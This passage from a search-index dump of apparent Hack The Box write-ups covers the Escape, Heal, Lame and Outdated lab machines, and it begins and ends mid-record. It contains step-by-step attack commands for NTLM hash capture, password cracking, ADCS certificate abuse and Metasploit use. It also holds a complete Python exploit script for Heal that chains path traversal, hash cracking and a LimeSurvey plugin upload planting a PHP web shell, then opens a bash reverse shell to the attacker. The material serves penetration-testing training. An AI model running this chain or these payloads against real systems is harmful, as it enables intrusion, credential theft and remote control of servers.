Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel\n| Not valid before: 2024-01-18T23:03:57\n|_Not valid after:  2074-01-05T23:03:57\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        .NET Message Framing\n49667/tcp open  msrpc         Microsoft Windows RPC\n49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49690/tcp open  msrpc         Microsoft Windows RPC\n49703/tcp open  msrpc         Microsoft Windows RPC\n49713/tcp open  msrpc         Microsoft Windows RPC\n53808/tcp open  msrpc         Microsoft Windows RPC\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: -16h00m07s, deviation: 0s, median: -16h00m07s\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2024-07-06T11:29:16\n|_  start_date: N/A\n</code></pre>"}, {"location": "HTB/Machines/Escape/#smb", "title": "SMB", "text": "<pre><code>$ smbclient -L //10.10.11.202/\nSharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share \n        Public          Disk      \n        SYSVOL          Disk      Logon server share\n\n$ smbclient //10.10.11.202/Public\nsmb: \\&gt; get \"SQL Server Procedures.pdf\"\n</code></pre> <p><code>cmdkey /add:\"&lt;serverName&gt;.sequel.htb\" /user:\"sequel\\&lt;userame&gt;\" /pass:&lt;password&gt;</code></p> <p><code>PublicUser:GuestUserCantWrite1</code></p>"}, {"location": "HTB/Machines/Escape/#mssql-steal-netntlm-hash-relay-attack", "title": "MSSQL steal NetNTLM hash / Relay attack", "text": "<p>Query SSL certs </p> <pre><code>$ openssl s_client -showcerts -connect 10.10.11.202:3269  | openssl x509 -noout -text\n</code></pre> <p></p> <pre><code>$ echo \"10.10.11.202 dc.sequel.htb sequel.htb dc\" | sudo tee -a /etc/hosts\n</code></pre> <pre><code>$ impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202 \n\n&gt; SELECT name, database_id, create_date  FROM sys.databases; \n&gt; use msdb;\n\n&gt; SELECT name FROM sys.tables;\n</code></pre> <p></p> <pre><code># Check if xp_cmdshell is enabled\n$ SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';\n\n# This turns on advanced options and is needed to configure xp_cmdshell\n$ sp_configure 'show advanced options', '1'\n$ RECONFIGURE\n#This enables xp_cmdshell\n$ sp_configure 'xp_cmdshell', '1'\n$ RECONFIGURE\n\n$ EXEC master..xp_cmdshell 'whoami'\n</code></pre> <p></p> <p>Cannot run <code>xp_cmdshell</code> and don't have permission to reconfig it. But in HackTricks <code>Pentesting MSSQL - Microsoft SQL Server</code>, it mentions <code>xp_dirtree</code>.</p> <p>MSSQL Steal NetNTLM hash / Relay attack | HackTricks</p> <pre><code>Use master;\nEXEC sp_helprotect 'xp_dirtree';\nEXEC sp_helprotect 'xp_subdirs';\nEXEC sp_helprotect 'xp_fileexist';\n</code></pre> <p></p> <pre><code>xp_dirtree '\\\\10.10.16.2\\any\\thing';\nexec master.dbo.xp_dirtree '\\\\10.10.16.2\\any\\thing';\n\n$ sudo responder -I tun0 \n\n$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\n\nREGGIE1234ronnie (sql_svc) \n</code></pre> <p></p> <p></p>"}, {"location": "HTB/Machines/Escape/#sql_svc", "title": "sql_svc", "text": "<pre><code>$ evil-winrm -i 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie'\n\n$ Get-ChildItem -Path C:\\Users\\ -Include *.* -File -Recurse -ErrorAction SilentlyContinue\n\n# C:\\sqlserver\\logs\\ERRORLOG.BAK\n\n&gt; type ERRORLOG.BAK\n\n2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]\n2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.\n2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]\n</code></pre> <p>Watch out the times of these error events. These three error messages almost happened at the same time. It might be a typo.</p>"}, {"location": "HTB/Machines/Escape/#ryancooper", "title": "Ryan.Cooper", "text": "<pre><code>$ evil-winrm -i 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3'\n</code></pre> <p>Identify ADCS</p> <p>One thing that always needs enumeration on a Windows domain is to look for Active Directory Certificate Services (ADCS). A quick way to check for this is using crackmapexec (and it works as either sql_svc or Ryan.Cooper):</p> <pre><code>$ crackmapexec ldap 10.10.11.202 -u ryan.cooper -p NuclearMosquito3 -M adcs\n\nADCS                                                Found PKI Enrollment Server: dc.sequel.htb\nADCS                                                Found CN: sequel-DC-CA\n</code></pre> <p></p> <pre><code>&gt; upload ../Tools/Certify.exe Certify.exe\n&gt; .\\Certify.exe find /vulnerable\n</code></pre> <p></p> <p>The danger here is that <code>sequel\\Domain Users</code> has Enrollment Rights for the certificate (this is scenario 3 in the Certify README).</p>"}, {"location": "HTB/Machines/Escape/#abuse-template", "title": "Abuse Template", "text": "<p>With Certify / Rubeus</p> <pre><code>$ .\\Certify.exe request /ca:dc.sequel.htb\\sequel-DC-CA /template:UserAuthentication /altname:administrator\n</code></pre> <p></p> <p>Copy the text from <code>-----BEGIN RSA PRIVATE KEY-----</code> to <code>-----END CERTIFICATE-----</code> into a file called <code>cert.pem</code> and covert it to <code>pfx</code> without password.</p> <pre><code>$ openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx\n</code></pre> <pre><code>&gt; .\\Rubeus.exe asktgt /user:administrator /certificate:C:\\programdata\\cert.pfx\n\n&gt; .\\Rubeus.exe asktgt /user:administrator /certificate:C:\\users\\ryan.cooper\\cert.pfx /getcredentials /show /nowrap\n</code></pre> <p></p> <p>NTLM: A52F78E4C751E5F5E17E1E9F3E58F4EE</p> <p></p> <p>With Certipy on Kali</p> <p>ly4k/Certipy</p> <pre><code>$ certipy-ad find -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -text -stdout -vulnerable\n</code></pre> <p></p> <pre><code>$ certipy-ad req -u ryan.cooper -p NuclearMosquito3 -target 10.10.11.202 -upn administrator@sequel.htb -ca sequel-dc-ca -template UserAuthentication\n</code></pre> <p></p> <pre><code>$ certipy-ad auth -pfx administrator.pfx\n</code></pre> <p></p> <p>I can sync the clock with Escape using <code>ntpdate</code>:</p> <pre><code>$ sudo ntpdate -u sequel.htb\n</code></pre> <p></p>"}, {"location": "HTB/Machines/Heal/", "title": "Heal", "text": ""}, {"location": "HTB/Machines/Heal/#port-scan", "title": "Port Scan", "text": "<pre><code>$ sudo nmap 10.10.11.46 -p- --min-rate=10000 -T4 -sCV\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)\n|_  256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-title: Heal\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n$ echo \"10.10.11.46 heal.htb api.heal.htb take-survey.heal.htb\" | sudo tee -a /etc/hosts\n</code></pre>"}, {"location": "HTB/Machines/Heal/#healhtb", "title": "Heal.htb", "text": "<p>LimeSurvey is an open-source survey tool.</p> <p></p> <p>https://cheatsheetseries.owasp.org/cheatsheets/Ruby_on_Rails_Cheat_Sheet.html</p> <p>Sensitive files in Ruby Rail applications.</p> <p></p> <p><code>../../config/database.yml</code></p> <pre><code># SQLite. Versions 3.8.0 and up are supported.\n#   gem install sqlite3\n#\n#   Ensure the SQLite 3 gem is defined in your Gemfile\n#   gem \"sqlite3\"\n#\ndefault: &amp;default\n  adapter: sqlite3\n  pool: &lt;%= ENV.fetch(\"RAILS_MAX_THREADS\") { 5 } %&gt;\n  timeout: 5000\n\ndevelopment:\n  &lt;&lt;: *default\n  database: storage/development.sqlite3\n\n# Warning: The database defined as \"test\" will be erased and\n# re-generated from your development database when you run \"rake\".\n# Do not set this db to the same as development or production.\ntest:\n  &lt;&lt;: *default\n  database: storage/test.sqlite3\n\nproduction:\n  &lt;&lt;: *default\n  database: storage/development.sqlite3\n</code></pre> <p><code>../../storage/development.sqlite3</code></p> <p></p> <p>Reproduce this request in browser and get the <code>development.sqlite3</code> file.</p> <p></p> <pre><code>username: ralph\n$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG\n\n$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\n\n147258369\n</code></pre> <p>[CVE-2021-44967] LimeSurvey RCE</p> <p>A Remote Code Execution (RCE) vulnerability exists in <code>LimeSurvey 5.2.4</code> via the upload and install plugins function, which could let a remote malicious user upload an arbitrary PHP code file.</p> <p>http://take-survey.heal.htb/index.php/admin/authentication/sa/login.php</p> <p></p> <p>Use the ralph's credential to login and explore the plugins settings.</p> <p></p> <p>The zip file has to contain a <code>config.xml</code> file.</p> <p>GitHub Y1LD1R1M-1337/Limesurvey-RCE</p> <p></p> <p></p> <p>LimeSurvey Community Edition Version 6.6.4 </p> <p>Since our LimeSurvey is 6.6.4, need to change the version accordingly in the xml file.</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;config&gt;\n    &lt;metadata&gt;\n        &lt;name&gt;Y1LD1R1M&lt;/name&gt;\n        &lt;type&gt;plugin&lt;/type&gt;\n        &lt;creationDate&gt;2020-03-20&lt;/creationDate&gt;\n        &lt;lastUpdate&gt;2020-03-31&lt;/lastUpdate&gt;\n        &lt;author&gt;Y1LD1R1M&lt;/author&gt;\n        &lt;authorUrl&gt;https://github.com/Y1LD1R1M-1337&lt;/authorUrl&gt;\n        &lt;supportUrl&gt;https://github.com/Y1LD1R1M-1337&lt;/supportUrl&gt;\n        &lt;version&gt;6.6.4&lt;/version&gt;\n        &lt;license&gt;GNU General Public License version 2 or later&lt;/license&gt;\n        &lt;description&gt;\n        &lt;![CDATA[Author : Y1LD1R1M]]&gt;&lt;/description&gt;\n    &lt;/metadata&gt;\n\n    &lt;compatibility&gt;\n        &lt;version&gt;3.0&lt;/version&gt;\n        &lt;version&gt;4.0&lt;/version&gt;\n        &lt;version&gt;5.0&lt;/version&gt;\n        &lt;version&gt;6.0&lt;/version&gt;\n    &lt;/compatibility&gt;\n    &lt;updaters disabled=\"disabled\"&gt;&lt;/updaters&gt;\n&lt;/config&gt;\n</code></pre> <p>http://take-survey.heal.htb/upload/plugins/Y1LD1R1M/shell.php</p> <p></p> <p>The main LimeSurvey configuration file is <code>config.php</code>. It's located in the <code>/application/config/</code> directory within the LimeSurvey installation. This file contains settings for database connections, email configuration, and other system-level settings. </p> <p><code>/var/www/limesurvey/application/config/config.php</code></p> <pre><code>db' =&gt; array(\n                        'connectionString' =&gt; 'pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;dbname=survey;',\n                        'emulatePrepare' =&gt; true,\n                        'username' =&gt; 'db_user',\n                        'password' =&gt; 'AdmiDi0_pA$$w0rd',\n                        'charset' =&gt; 'utf8',\n                        'tablePrefix' =&gt; 'lime_',\n</code></pre>"}, {"location": "HTB/Machines/Heal/#shell-as-ron", "title": "Shell as Ron", "text": "<pre><code>ssh ron@heal.htb\npassword: AdmiDi0_pA$$w0rd\n</code></pre>"}, {"location": "HTB/Machines/Heal/#privilege-escalation", "title": "Privilege Escalation", "text": "<pre><code>$ ps -aux | grep \"root\"\nroot        1804  0.7  2.7 1359780 108588 ?      Ssl  May20   6:54 /usr/local/bin/consul agent -server -ui -advertise=127.0.0.1 -bind=127.0.0.1 -data-dir=/var/lib/consul -node=consul-01 -config-dir=/etc/consul.d\nroot       23090  0.0  0.2 239656  8932 ?        Ssl  May20   0:00 /usr/libexec/upowerd\nroot       50656  0.0  0.0      0     0 ?        I    01:08   0:03 [kworker/0:0-rcu_gp]\nroot       51470  0.0  0.0      0     0 ?        I    01:38   0:02 [kworker/1:2-events]\nroot       51676  0.0  0.0      0     0 ?        I    01:43   0:00 [kworker/u256:3-events_power_efficient]\nroot       52367  0.0  0.2  17180 11028 ?        Ss   02:07   0:00 sshd: ron [priv]\nroot       52375  0.0  0.0      0     0 ?        I    02:08   0:00 [kworker/1:0-events]\nroot       52499  0.0  0.0      0     0 ?        I    02:08   0:00 [kworker/0:1-events]\nroot       52682  0.0  0.0      0     0 ?        I    02:12   0:00 [kworker/u256:1-events_unbound]\nroot       52842  0.0  0.0      0     0 ?        I    02:19   0:00 [kworker/u256:0-events_unbound]\n\n$ netstat -tuln\nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State      \ntcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     \ntcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN     \ntcp        0      0 127.0.0.1:3001          0.0.0.0:*               LISTEN     \ntcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN     \ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     \ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     \ntcp        0      0 127.0.0.1:8302          0.0.0.0:*               LISTEN     \ntcp        0      0 127.0.0.1:8301          0.0.0.0:*               LISTEN     \ntcp        0      0 127.0.0.1:8300          0.0.0.0:*               LISTEN     \ntcp        0      0 127.0.0.1:8600          0.0.0.0:*               LISTEN     \ntcp        0      0 127.0.0.1:8503          0.0.0.0:*               LISTEN     \ntcp        0      0 127.0.0.1:8500          0.0.0.0:*               LISTEN     \ntcp6       0      0 :::22                   :::*                    LISTEN   \n</code></pre> <pre><code># search for running service\n$ systemctl list-units --type=service --state=running\n\n  UNIT                        LOAD   ACTIVE SUB     DESCRIPTION                                                 \n  auditd.service              loaded active running Security Auditing Service\n  avahi-daemon.service        loaded active running Avahi mDNS/DNS-SD Stack\n  consul.service              loaded active running Consul Service Discovery Agent\n.........\n\n# Find the Service File Location\n$ systemctl show consul.service --no-page | grep FragmentPath\n\nFragmentPath=/etc/systemd/system/consul.service\n</code></pre> <pre><code>$ ssh -L 8500:127.0.0.1:8500 ron@heal.htb\npassword: AdmiDi0_pA$$w0rd\n</code></pre> <p>Hashicorp Consul Remote Command Execution via Services API</p> <p></p> <pre><code>use exploit/multi/misc/consul_service_exec\nset RHOSTS 127.0.0.1\nset LHOST 10.10.15.103\ncheck\nrun\n</code></pre> <p></p>"}, {"location": "HTB/Machines/Heal/#poc-all-in-one-for-preparing-oswe", "title": "POC all in one for preparing OSWE", "text": "<pre><code>import argparse, requests, re, bcrypt\nimport zipfile\nfrom io import BytesIO\nfrom urllib.parse import unquote_plus\n\ntest_user={\"username\":\"yingtest\",\"fullname\":\"yingtest\",\"email\":\"test@htb.com\",\"password\":\"Test1234\"}\n\nproxies = {\n    \"http\": \"http://127.0.0.1:8080\",\n    \"https\": \"http://127.0.0.1:8080\"\n}\n\ndef signup_user(target, session):\n    url = f\"http://api.{target}/signup\"\n    headers = {\n        \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\",\n        \"Origin\": f\"http://{target}\",\n        \"Referer\": f\"http://{target}/\"\n    }\n\n    response = session.post(url, headers=headers, json=test_user, proxies=proxies, verify=False)\n    if response.status_code == 201:\n        token = response.json()[\"token\"]\n        print(\"Create user succeed. User token is \", token)\n        return token\n    print(\"Create user failed.\")\n    return None\n\ndef extract_password_hash(target, session, token):\n    url = f\"http://api.{target}/download\"\n    params = {\n        \"filename\": \"../../storage/development.sqlite3\"\n    }\n    headers = {\n        \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\",\n        \"Origin\": f\"http://{target}\",\n        \"Referer\": f\"http://{target}/\",\n        \"Authorization\": f\"Bearer {token}\"\n    }\n\n    response = session.get(url, params=params, headers=headers, proxies=proxies, verify=False)\n    if response.status_code == 200:\n        match = re.search(\"ralph@heal.htb(.*?)2024\", response.text)\n        if match:\n            pass_hash = match.group(1)\n            print(f\"[+] Successfully extracted password hash: {pass_hash}\")\n            return pass_hash\n        else:\n            print(f\"[-] Extracted password hash failed: {response.text}\")\n            return None\n\ndef crack_pass_hash(pass_hash):\n    wordlist_path = \"/usr/share/wordlists/rockyou.txt\"\n    try:\n        with open(wordlist_path, \"r\", encoding=\"latin-1\") as f:\n            for password in f:\n                password = password.strip()  # Remove newline\n                password_bytes = password.encode('utf-8')\n                try:\n                    if bcrypt.checkpw(password_bytes, pass_hash):\n                        print(f\"\\n[+] Password found: '{password}'\")\n                        return password\n                except:\n                    continue\n                # Print progress (optional)\n                print(f\"\\rTrying: {password[:50]}\", end=\"\", flush=True)\n    except FileNotFoundError:\n        print(f\"[-] Error: Wordlist not found at {wordlist_path}\")\n    except Exception as e:\n        print(f\"[-] Error: {e}\")\n    return None\n\ndef admin_login(target, session, passwd):\n    url = f\"http://take-survey.{target}/index.php/admin/authentication/sa/login\"\n    headers = {\n        \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\",\n        \"Referer\": f\"http://take-survey.{target}/index.php/admin/pluginmanager?sa=index\",\n    }\n\n    response = session.get(url, headers=headers, verify=False)\n    YII_CSRF_TOKEN = unquote_plus(response.cookies.get(\"YII_CSRF_TOKEN\")) # Decodes standard URL encoding \n    print(f\"[+] YII_CSRF_TOKEN is {YII_CSRF_TOKEN}\")\n    data = {\n        \"YII_CSRF_TOKEN\": YII_CSRF_TOKEN,\n        \"authMethod\": \"Authdb\",\n        \"user\": \"ralph\",\n        \"password\": passwd,\n        \"loginlang\": \"default\",\n        \"action\": \"login\",\n        \"width\": 1920,\n        \"login_submit\": \"login\"\n    }\n    response = session.post(url, data=data, proxies=proxies, verify=False)\n    if response.status_code == 200:\n        print(\"[+] Ralph login succeed!\")\n        YII_CSRF_TOKEN = unquote_plus(response.cookies.get(\"YII_CSRF_TOKEN\")) # Decodes standard URL encoding\n        print(\"[+] Ralph YII_CSRF_TOKEN: \", YII_CSRF_TOKEN)\n        return YII_CSRF_TOKEN\n    else:\n        print(\"[-] Ralph login failed.\")\n        return None\n\ndef upload_plugin(target, session, lhost, lport, YII_CSRF_TOKEN):\n    zipfile_name = \"Y1LD1R1M.zip\"\n    build_zip_file(zipfile_name)\n    url = f\"http://take-survey.{target}/index.php/admin/pluginmanager?sa=upload\"\n    with open(zipfile_name, 'rb') as f:\n        file_content = f.read()\n    boundary = \"---------------------------425455098717253985162609657206\"\n    headers = {\n        \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\",\n        \"Content-Type\": f\"multipart/form-data; boundary={boundary}\",\n        \"Origin\": f\"http://take-survey.{target}\",\n        \"Referer\": f\"http://take-survey.{target}/index.php/admin/pluginmanager?sa=index\",\n    }\n\n    data = (f\"--{boundary}\\r\\n\"\n            f'Content-Disposition: form-data; name=\"YII_CSRF_TOKEN\"\\r\\n\\r\\n{YII_CSRF_TOKEN}\\r\\n'\n            f\"--{boundary}\\r\\n\"\n            f'Content-Disposition: form-data; name=\"lid\"\\r\\n\\r\\n'\n            f\"$lid\\r\\n\"\n            f\"--{boundary}\\r\\n\"\n            f'Content-Disposition: form-data; name=\"action\"\\r\\n\\r\\n'\n            f\"templateupload\\r\\n\"\n            f\"--{boundary}\\r\\n\"\n            f'Content-Disposition: form-data; name=\"the_file\"; filename=\"Y1LD1R1M.zip\"Content-Disposition: form-data; name=\"the_file\"; filename=\"{zipfile_name}\"\\r\\nContent-Type: application/zip\\r\\n\\r\\n').encode() + file_content + (\n                f\"\\r\\n--{boundary}--\\r\\n\"\n            ).encode()\n    response = session.post(url, data=data, proxies=proxies, headers=headers, verify=False)\n    if response.status_code == 200:\n        print(\"[+] Install plugin.\")\n        url = f\"http://take-survey.{target}/index.php/admin/pluginmanager?sa=installUploadedPlugin\"\n        data = {\n            \"YII_CSRF_TOKEN\": YII_CSRF_TOKEN,\n            \"isUpdate\": False\n        }\n        response = session.post(url, data=data, proxies=proxies, verify=False)\n        if response.status_code == 200:\n            print(\"[+] Triggering RCE....\")\n            url = f\"http://take-survey.{target}/upload/plugins/Y1LD1R1M/shell.php\"\n            payload = f\"bash -c 'bash -i &gt;&amp; /dev/tcp/{lhost}/{lport} 0&gt;&amp;1'\"\n            params = {\n                \"cmd\":payload\n            }\n            session.get(url, params=params, proxies=proxies, verify=False)\n\ndef build_zip_file(zipfile_name):\n    # Use BytesIO instead of StringIO for binary data\n    with BytesIO() as f:\n        with zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED) as z:\n            z.writestr('shell.php', '&lt;?php system($_GET[\"cmd\"]); ?&gt;')\n            z.writestr('config.xml', \n                       r'''&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;config&gt;\n    &lt;metadata&gt;\n        &lt;name&gt;Y1LD1R1M&lt;/name&gt;\n        &lt;type&gt;plugin&lt;/type&gt;\n        &lt;creationDate&gt;2020-03-20&lt;/creationDate&gt;\n        &lt;lastUpdate&gt;2020-03-31&lt;/lastUpdate&gt;\n        &lt;author&gt;Y1LD1R1M&lt;/author&gt;\n        &lt;authorUrl&gt;https://github.com/Y1LD1R1M-1337&lt;/authorUrl&gt;\n        &lt;supportUrl&gt;https://github.com/Y1LD1R1M-1337&lt;/supportUrl&gt;\n        &lt;version&gt;6.6.4&lt;/version&gt;\n        &lt;license&gt;GNU General Public License version 2 or later&lt;/license&gt;\n        &lt;description&gt;\n        &lt;![CDATA[Author : Y1LD1R1M]]&gt;&lt;/description&gt;\n    &lt;/metadata&gt;\n\n    &lt;compatibility&gt;\n        &lt;version&gt;3.0&lt;/version&gt;\n        &lt;version&gt;4.0&lt;/version&gt;\n        &lt;version&gt;5.0&lt;/version&gt;\n        &lt;version&gt;6.0&lt;/version&gt;\n    &lt;/compatibility&gt;\n    &lt;updaters disabled=\"disabled\"&gt;&lt;/updaters&gt;\n&lt;/config&gt;''')\n\n        # Write the zip content to file\n        with open(zipfile_name, 'wb') as zip_file:\n            zip_file.write(f.getvalue())\n\nif __name__==\"__main__\":\n    parser = argparse.ArgumentParser()\n    parser.add_argument('-t', '--target', help=\"Target URL, eg. heal.htb\", required=True)\n    parser.add_argument('-l', '--lhost', help=\"Local listener's IP\", required=True)\n    parser.add_argument('-p', '--lport', help=\"Local listener's Port\", required=True)\n    args = parser.parse_args()\n\n    # add \"heal.htb api.heal.htb take-survey.heal.htb\" to /etc/hosts\n\n    session = requests.Session()\n    # signup a user\n    token = signup_user(args.target, session)\n    if token:\n        # read ../../storage/development.sqlite3 to get ralph's password hash\n        pass_hash = extract_password_hash(args.target, session, token)\n        if pass_hash:\n            passwd = crack_pass_hash(pass_hash.encode('utf-8'))\n            if passwd:\n                # login as ralph\n                YII_CSRF_TOKEN = admin_login(args.target, session, passwd)\n                if YII_CSRF_TOKEN:\n                    upload_plugin(args.target, session, args.lhost, args.lport, YII_CSRF_TOKEN)\n</code></pre>"}, {"location": "HTB/Machines/Lame/", "title": "Lame", "text": ""}, {"location": "HTB/Machines/Lame/#port-scan", "title": "Port scan", "text": "<pre><code>$ sudo nmap 10.10.10.3 -p- --min-rate=10000 -T4 -sCV\n\nPORT    STATE SERVICE     VERSION\n21/tcp  open  ftp         vsftpd 2.3.4\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to 10.10.15.103\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      vsFTPd 2.3.4 - secure, fast, stable\n|_End of status\n|_ftp-anon: Anonymous FTP login allowed (FTP code 230)\n22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)\n| ssh-hostkey: \n|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)\n|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)\n139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n| smb-os-discovery: \n|   OS: Unix (Samba 3.0.20-Debian)\n|   Computer name: lame\n|   NetBIOS computer name: \n|   Domain name: hackthebox.gr\n|   FQDN: lame.hackthebox.gr\n|_  System time: 2025-05-05T02:18:51-04:00\n|_clock-skew: mean: 2h00m21s, deviation: 2h49m45s, median: 19s\n|_smb2-time: Protocol negotiation failed (SMB2)\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n</code></pre>"}, {"location": "HTB/Machines/Outdated/", "title": "Outdated", "text": ""}, {"location": "HTB/Machines/Outdated/#port-scan", "title": "Port scan", "text": "<pre><code>$ sudo nmap 10.10.11.175 -p- -T4 --min-rate=10000 -sCV \nPORT      STATE SERVICE       VERSION\n25/tcp    open  smtp          hMailServer smtpd\n| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP\n|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY\n53/tcp    open  domain        Simple DNS Plus\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-07-13 11:52:35Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC.outdated.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.outdated.htb\n| Not valid before: 2023-12-13T00:17:36\n|_Not valid after:  2024-12-12T00:17:36\n|_ssl-date: 2024-07-13T11:54:13+00:00; +7h59m58s from scanner time.\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC.outdated.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.outdated.htb\n| Not valid before: 2023-12-13T00:17:36\n|_Not valid after:  2024-12-12T00:17:36\n|_ssl-date: 2024-07-13T11:54:12+00:00; +7h59m58s from scanner time.\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2024-07-13T11:54:13+00:00; +7h59m58s from scanner time.\n| ssl-cert: Subject: commonName=DC.outdated.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.outdated.htb\n| Not valid before: 2023-12-13T00:17:36\n|_Not valid after:  2024-12-12T00:17:36\n3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2024-07-13T11:54:12+00:00; +7h59m58s from scanner time.\n| ssl-cert: Subject: commonName=DC.outdated.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.outdated.htb\n| Not valid before: 2023-12-13T00:17:36\n|_Not valid after:  2024-12-12T00:17:36\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n8530/tcp  open  http          Microsoft IIS httpd 10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: Site doesn't have a title.\n8531/tcp  open  unknown\n9389/tcp  open  mc-nmf        .NET Message Framing\n49667/tcp open  msrpc         Microsoft Windows RPC\n49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49690/tcp open  msrpc         Microsoft Windows RPC\n49923/tcp open  msrpc         Microsoft Windows RPC\n49944/tcp open  msrpc         Microsoft Windows RPC\nService Info: Hosts: mail.outdated.htb, DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2024-07-13T11:53:32\n|_  start_date: N/A\n|_clock-skew: mean: 7h59m57s, deviation: 0s, median: 7h59m57s\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n</code></pre>"}, {"location": "HTB/Machines/Outdated/#smb-server", "title": "SMB server", "text": "<pre><code>$ smbclient -L //10.10.11.175/                    \nPassword for [WORKGROUP\\kali]:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share \n        Shares          Disk      \n        SYSVOL          Disk      Logon server share \n        UpdateServicesPackages Disk      A network share to be used by client systems for collecting all 